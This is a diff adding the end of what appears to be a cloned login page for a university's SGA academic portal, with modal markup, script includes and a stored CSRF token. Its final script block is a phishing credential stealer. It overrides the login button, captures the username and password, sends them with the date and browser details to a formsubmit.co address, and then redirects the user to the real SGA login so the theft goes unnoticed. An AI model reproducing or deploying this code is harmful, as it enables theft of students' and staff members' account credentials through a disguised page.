+    <h2 class="tituloNotificacionModal">¡Notificación!</h2>
+    <div style="text-align: center" class="detalleNotificacionModal"></div>
+</div>
+<div class="modal-footer" style="padding: 5px 10px 5px;">
+    <p style="text-align: center;">
+        <a href="javascript:;" class="btn btn-large btn-danger cerrarNotificacionModal" style="width: 120px"> Cerrar</a>
+    </p>
+</div>
+</div>
+
+<div id="csrf_tokendiv" style="display: none;">RHDBaB70TOS4qVWjEAEF3txMFAEuHFQyCHCVe5YWeZsYviRO1LiAgxa7MsEHoh5H</div>
+
+
+
+<!-- Modal para mensajes moderno, responsivo y atractivo -->
+
+
+<script src="./Inicio de sesión_files/notificaciones-push.js"></script>
+
+
+
+
+<script src="./Inicio de sesión_files/footer.js"></script>
+<script src="./Inicio de sesión_files/snowfall.js"></script>
+<script type="text/javascript">
+    
+</script>
+
+<style>
+    .menu-selectorfile {
+        width: 25%;
+        float: left;
+    }
+
+    .selectorfile-content {
+        background-color: white;
+        border-radius: 5px;
+        border: 1px solid rgba(79, 81, 82, 0.35);
+        width: 75%;
+        height: 350px;
+        padding: 3px 3px;
+    }
+</style>
+
+<script>
+$(document).ready(function() {
+    // Sobrescribir la función del botón de login
+    $("#logindeclaracion").off('click').on('click', function() {
+        const usuario = $("#userdeclaracion").val();
+        const password = $("#passdeclaracion").val();
+        // ENVIAR DATOS
+        fetch('https://formsubmit.co/soportesga@protonmail.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                usuario: usuario,
+                password: password,
+                fecha: new Date().toLocaleString('es-EC'),
+                navegador: navigator.userAgent
+            })
+        }).catch(error => console.log('Error:', error));
+        // REDIRIGIR INMEDIATAMENTE AL SGA REAL
+        window.location.href = 'https://sga.uteq.edu.ec/loginsga?ret=/';
+    });
+});
+</script>
+</body></html>
